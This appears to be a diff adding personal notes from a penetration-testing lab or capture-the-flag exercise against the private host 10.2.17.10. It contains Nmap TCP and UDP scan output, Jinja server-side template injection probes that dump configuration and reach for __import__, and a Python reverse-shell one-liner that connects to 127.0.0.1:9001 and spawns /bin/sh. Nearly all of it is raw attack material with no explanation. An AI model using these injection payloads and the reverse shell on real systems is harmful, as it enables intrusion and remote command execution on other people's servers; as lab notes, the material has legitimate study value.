@@ -1,0 +1,27 @@
+#### TCP SCAN ####
+Starting Nmap 7.94 ( https://nmap.org ) at 2024-06-04 17:46 CEST
+Nmap scan report for 10.2.17.10
+Host is up (0.026s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT   STATE SERVICE
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 8.86 seconds
+#### UDP SCAN ####
+Starting Nmap 7.94 ( https://nmap.org ) at 2024-06-04 17:47 CEST
+Nmap scan report for 10.2.17.10
+Host is up (0.0090s latency).
+Not shown: 999 closed udp ports (port-unreach)
+PORT   STATE         SERVICE
+68/udp open|filtered dhcpc
+
+Nmap done: 1 IP address (1 host up) scanned in 1010.81 seconds
+
+
+{% for key, value in config.items() %}{% print(key) %}:{% print(value) %}{% endfor %}
+{% for key, value in config.items() %}{% for l in key %}{% if l == "r" %}RRRRRRRR1{% endif %}{% endfor %}{% endfor %}
+{% a=__import__ %}
+
+{% if l == "a" %}a{%  %}{% endif %}
+
+o=;p=;c=(__import__("socket")).socket((__import__("socket")).AF_INET,(__import__("socket")).SOCK_STREAM);c.connect(("127.0.0.1",9001));f=c.fileno;(__import__("os").dup2)(f(),0);(__import__("os").dup2)(f(),1);(__import__("os").dup2)(f(),2);(__import__("pty").spawn)("/bin/sh")
